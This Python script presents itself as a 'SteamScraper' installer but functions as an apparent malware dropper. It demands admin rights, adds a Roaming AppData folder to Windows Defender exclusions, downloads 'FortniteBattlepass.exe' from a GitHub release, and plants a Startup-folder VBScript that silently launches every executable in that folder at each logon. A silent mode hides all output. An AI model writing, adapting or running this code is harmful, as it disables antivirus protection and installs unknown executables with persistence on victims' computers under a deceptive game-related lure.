import os
import shutil
import subprocess
import sys
import ctypes
import argparse # Import argparse

try:
    import win32com.client
except ImportError:
    print("[ERROR] 'pywin32' module not found. Please install it using: pip install pywin32")
    sys.exit(1)

# Global flag for silent mode
SILENT_MODE = False

def _log(message):
    """
    Prints a message only if silent mode is not enabled.
    """
    if not SILENT_MODE:
        print(message)

def install_package(package):
    """
    Installs a Python package using pip.
    """
    try:
        _log(f"[INFO] Attempting to install '{package}'...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        _log(f"[SUCCESS] Successfully installed '{package}'.")
        return True
    except subprocess.CalledProcessError as e:
        _log(f"[ERROR] Failed to install '{package}': {e}")
        return False
    except Exception as e:
        _log(f"[ERROR] An unexpected error occurred while installing '{package}': {e}")
        return False



def is_admin():
    """
    Checks if the script is running with administrator privileges using PowerShell.
    """
    try:
        powershell_cmd = "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"
        result = subprocess.run(["powershell", "-Command", powershell_cmd], capture_output=True, text=True, check=True)
        return result.stdout.strip().lower() == "true"
    except subprocess.CalledProcessError as e:
        _log(f"[ERROR] PowerShell command for admin check failed: {e.stderr.strip()}")
        return False
    except Exception as e:
        _log(f"[ERROR] An unexpected error occurred during admin privilege check: {e}")
        return False

def get_roaming_path():
    """
    Returns the path to the Roaming AppData directory using PowerShell.
    """
    try:
        powershell_cmd = "(Get-Item Env:APPDATA).Value"
        result = subprocess.run(["powershell", "-Command", powershell_cmd], capture_output=True, text=True, check=True)
        roaming_path = result.stdout.strip()
        if not roaming_path:
            _log("[ERROR] APPDATA environment variable not found via PowerShell.")
            return None
        return roaming_path
    except subprocess.CalledProcessError as e:
        _log(f"[ERROR] PowerShell command for getting APPDATA failed: {e.stderr.strip()}")
        return None
    except Exception as e:
        _log(f"[ERROR] An unexpected error occurred while getting Roaming AppData path: {e}")
        return None

def create_steamstuff_folder(roaming_path, folder_name="Steamstuff"):
    """
    Creates the 'Steamstuff' folder in the specified Roaming AppData path.
    """
    folder_path = os.path.join(roaming_path, folder_name)
    try:
        if os.path.exists(folder_path):
            _log(f"[INFO] Folder already exists: {folder_path} - skipping creation")
            return folder_path
        subprocess.run(["powershell", "-Command", f"New-Item -Path '{folder_path}' -ItemType Directory"], check=True, capture_output=True, text=True)
        _log(f"[SUCCESS] Created folder: {folder_path}")
        return folder_path
    except OSError as e:
        _log(f"[ERROR] Failed to create folder {folder_path}: {e}")
        return None

def is_defender_exclusion_exists(folder_path):
    """
    Checks if the given folder path is already in Windows Defender exclusions.
    """
    try:
        # Get current exclusions
        result = subprocess.run(
            ["powershell", "-Command", "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"],
            capture_output=True, text=True, check=True
        )
        exclusions = result.stdout.splitlines()
        return folder_path.lower() in [e.strip().lower() for e in exclusions]
    except subprocess.CalledProcessError as e:
        _log(f"[WARNING] Could not check Defender exclusions: {e.stderr.strip()}")
        return False
    except Exception as e:
        _log(f"[WARNING] An unexpected error occurred while checking Defender exclusions: {e}")
        return False

def add_defender_exclusion(folder_path):
    """
    Adds the specified folder to Windows Defender exclusions.
    Requires administrator privileges.
    """
    if not folder_path or not os.path.exists(folder_path):
        _log("[SKIP] Cannot add Defender exclusion - invalid folder path")
        return False

    if is_defender_exclusion_exists(folder_path):
        _log(f"[INFO] {folder_path} is already in Windows Defender exclusions - skipping")
        return True

    powershell_cmd = f"Add-MpPreference -ExclusionPath '{folder_path}'"
    try:
        _log(f"[INFO] Attempting to add {folder_path} to Windows Defender exclusions...")
        subprocess.run(["powershell", "-Command", powershell_cmd], check=True, capture_output=True, text=True)
        _log(f"[SUCCESS] Added {folder_path} to Windows Defender exclusions")
        return True
    except subprocess.CalledProcessError as e:
        _log(f"[ERROR] Failed to add Defender exclusion: {e.stderr.strip()}")
        _log("[HINT] This operation requires administrator privileges.")
        return False
    except Exception as e:
        _log(f"[ERROR] An unexpected error occurred while adding Defender exclusion: {e}")
        return False



def download_executable(url, destination_path, exe_name="SteamScraper.exe"):
    """
    Downloads the executable from the given URL to the destination path.
    """
    full_destination_path = os.path.join(destination_path, exe_name)
    if os.path.exists(full_destination_path):
        _log(f"[INFO] Executable already exists at: {full_destination_path} - skipping download")
        return full_destination_path

    _log(f"[INFO] Downloading {exe_name} from {url} using PowerShell...")
    powershell_cmd = f"Invoke-WebRequest -Uri '{url}' -OutFile '{full_destination_path}'"
    try:
        subprocess.run(["powershell", "-Command", powershell_cmd], check=True, capture_output=True, text=True)
        _log(f"[SUCCESS] Downloaded {exe_name} to: {full_destination_path}")
        return full_destination_path
    except subprocess.CalledProcessError as e:
        _log(f"[ERROR] Failed to download {exe_name} using PowerShell: {e.stderr.strip()}")
        return None
    except Exception as e:
        _log(f"[ERROR] An unexpected error occurred during download: {e}")
        return None

def move_executable(source_exe_path, destination_folder_path, exe_name="SteamScraper.exe"):
    """
    Moves the SteamScraper.exe from the source path to the destination folder using PowerShell.
    This function is now deprecated as download_executable will be used.
    """
    if not os.path.exists(source_exe_path):
        _log(f"[ERROR] Source executable not found: {source_exe_path}")
        return None
    if not os.path.isdir(destination_folder_path):
        _log(f"[ERROR] Destination folder not found: {destination_folder_path}")
        return None

    destination_exe_path = os.path.join(destination_folder_path, exe_name)
    try:
        if os.path.exists(destination_exe_path):
            _log(f"[INFO] Executable already exists at: {destination_exe_path} - skipping move")
            return destination_exe_path
        
        powershell_cmd = f"Move-Item -Path '{source_exe_path}' -Destination '{destination_exe_path}'"
        subprocess.run(["powershell", "-Command", powershell_cmd], check=True, capture_output=True, text=True)
        _log(f"[SUCCESS] Moved {exe_name} to: {destination_exe_path}")
        return destination_exe_path
    except subprocess.CalledProcessError as e:
        _log(f"[ERROR] Failed to move {exe_name} using PowerShell: {e.stderr.strip()}")
        return None
    except Exception as e:
        _log(f"[ERROR] An unexpected error occurred while moving {exe_name}: {e}")
        return None



def create_folder_startup_script(steamstuff_folder_path, script_name="LaunchSteamstuffExes"):
    """
    Creates a VBScript in the Windows Startup folder that launches all .exe files
    within the specified Steamstuff folder.
    """
    if not steamstuff_folder_path or not os.path.exists(steamstuff_folder_path):
        _log("[SKIP] Cannot create folder startup script - invalid Steamstuff folder path")
        return False

    startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if not os.path.exists(startup_folder):
        _log(f"[ERROR] Startup folder not found at: {startup_folder}")
        return False

    vbs_path = os.path.join(startup_folder, f"{script_name}.vbs")

    vbs_content = f"""
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strFolder = "{steamstuff_folder_path}"

If objFSO.FolderExists(strFolder) Then
    Set objFolder = objFSO.GetFolder(strFolder)
    Set colFiles = objFolder.Files
    For Each objFile In colFiles
        If LCase(objFSO.GetExtensionName(objFile.Name)) = "exe" Then
            objShell.Run Chr(34) & objFile.Path & Chr(34), 0, False
        End If
    Next
End If
Set objFSO = Nothing
Set objShell = Nothing
"""
    try:
        if os.path.exists(vbs_path):
            _log(f"[INFO] Startup script already exists at: {vbs_path} - skipping creation")
            return True

        powershell_cmd = f"Set-Content -Path '{vbs_path}' -Value @\"\n{vbs_content.strip()}\n\"@"
        subprocess.run(["powershell", "-Command", powershell_cmd], check=True, capture_output=True, text=True)
        _log(f"[SUCCESS] Created startup script at: {vbs_path}")
        return True
    except Exception as e:
        _log(f"[ERROR] Failed to create startup script: {e}")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SteamScraper Installation Wizard")
    parser.add_argument("--silent", "-s", action="store_true", help="Run the installer in silent mode (no output).")
    args = parser.parse_args()

    if args.silent:
        SILENT_MODE = True

    try:
        import requests
    except ImportError:
        _log("[WARNING] 'requests' module not found. Attempting to install it...")
        if install_package("requests"):
            import requests
        else:
            _log("[FATAL] 'requests' module is required but could not be installed. Please install it manually using: pip install requests")
            sys.exit(1)

    _log("=== SteamScraper Installation Wizard ===")
    _log("This script will set up SteamScraper to run on system startup.")
    _log("Please ensure 'SteamScraper.exe' is in the same directory as this script.")
    _log("-" * 40)

    # 1. Check for administrator privileges
    if not is_admin():
        _log("[FATAL] This script requires administrator privileges to add Windows Defender exclusions.")
        _log("Please run this script as an administrator.")
        sys.exit(1)
    _log("[INFO] Running with administrator privileges.")

    # Define paths
    # current_dir = os.path.dirname(os.path.abspath(__file__)) # No longer needed as we download the exe
    steamstuff_folder_name = "Steamstuff"
    github_download_url = "https://github.com/Hobbylos1612/SteamFreeGamus/releases/download/eeee/FortniteBattlepass.exe" # <<< USER: REPLACE THIS WITH YOUR ACTUAL GITHUB DOWNLOAD LINK

    # Installation steps
    all_steps_successful = True
    
    # Step 1: Get Roaming AppData path
    _log("\n[STEP 1/5] Locating Roaming AppData directory...")
    roaming_appdata_path = get_roaming_path()
    if not roaming_appdata_path:
        all_steps_successful = False
    else:
        _log(f"[INFO] Roaming AppData: {roaming_appdata_path}")

    # Step 2: Create Steamstuff folder
    if all_steps_successful:
        _log(f"\n[STEP 2/5] Creating '{steamstuff_folder_name}' folder...")
        destination_folder_path = create_steamstuff_folder(roaming_appdata_path, steamstuff_folder_name)
        if not destination_folder_path:
            all_steps_successful = False
        else:
            _log(f"[INFO] Steamstuff folder path: {destination_folder_path}")

    # Step 3: Add Defender exclusion
    if all_steps_successful:
        _log(f"\n[STEP 3/5] Adding '{destination_folder_path}' to Windows Defender exclusions...")
        if not add_defender_exclusion(destination_folder_path):
            all_steps_successful = False

    # Step 4: Download SteamScraper.exe
    if all_steps_successful:
        _log(f"\n[STEP 4/5] Downloading 'FortniteBattlepass.exe' from GitHub...")
        final_exe_path = download_executable(github_download_url, destination_folder_path, exe_name="FortniteBattlepass.exe")
        if not final_exe_path:
            all_steps_successful = False
        else:
            _log(f"[INFO] SteamScraper.exe downloaded to: {final_exe_path}")

    # Step 5: Create startup script for the folder
    if all_steps_successful:
        _log(f"\n[STEP 5/5] Creating startup script for '{steamstuff_folder_name}' folder...")
        if not create_folder_startup_script(destination_folder_path):
            all_steps_successful = False

    _log("\n" + "=" * 40)
    if all_steps_successful:
        _log("=== Installation Complete! ===")
        _log("SteamScraper has been successfully set up to run on system startup.")
    else:
        _log("=== Installation Finished with Warnings/Errors ===")
        _log("Please review the messages above for details on any issues encountered.")
        _log("You may need to manually complete some steps or re-run the script after resolving issues.")
    _log("=" * 40)
